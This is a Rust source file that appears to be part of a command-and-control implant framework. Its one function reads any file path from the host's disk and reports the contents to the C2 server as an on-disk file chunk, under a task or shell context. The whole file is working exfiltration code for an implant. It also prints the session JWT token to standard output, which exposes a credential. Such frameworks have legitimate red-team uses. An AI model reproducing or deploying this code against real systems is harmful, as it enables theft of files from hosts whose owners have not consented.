use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::{Agent, ContextProvider, ReportContext};
use pb::{c2, eldritch};

pub fn file(
    agent: Arc<dyn Agent>,
    context_provider: Arc<dyn ContextProvider>,
    path: String,
) -> Result<(), String> {
    let content = std::fs::read(&path).map_err(|e| e.to_string())?;

    let metadata = eldritch::FileMetadata {
        path: path.clone(),
        ..Default::default()
    };
    let file_msg = eldritch::File {
        metadata: Some(metadata),
        chunk: content,
    };

    let context = match context_provider.get_context() {
        ReportContext::Task(ctx) => {
            println!("reporting file chunk with JWT: {}", ctx.jwt);
            Some(c2::report_file_request::Context::TaskContext(ctx))
        }
        ReportContext::Shell(ctx) => {
            println!("reporting file chunk with Shell JWT: {}", ctx.jwt);
            Some(c2::report_file_request::Context::ShellContext(ctx))
        }
    };

    let req = c2::ReportFileRequest {
        context,
        chunk: Some(file_msg),
        kind: c2::ReportFileKind::Ondisk as i32,
    };

    agent.report_file(req).map(|_| ())
}
